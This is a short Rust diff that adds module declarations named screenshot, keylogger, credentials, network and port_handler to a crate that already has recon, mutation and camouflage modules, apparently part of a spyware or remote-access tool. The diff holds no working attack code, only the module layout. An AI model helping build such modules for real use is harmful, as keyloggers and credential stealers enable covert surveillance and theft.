@@ -5,6 +5,13 @@ pub mod recon;
 pub mod crypto;
 pub mod mutation;
 pub mod camouflage;
+pub mod screenshot;
+pub mod keylogger;
+pub mod credentials;
+#[allow(dead_code, unused_imports, unused_variables, unused_mut)]
+pub mod network;
+#[allow(dead_code, unused_imports, unused_variables, unused_mut)]
+pub mod port_handler;
 
 pub use config::Config;
 pub use crypto::CryptoManager;
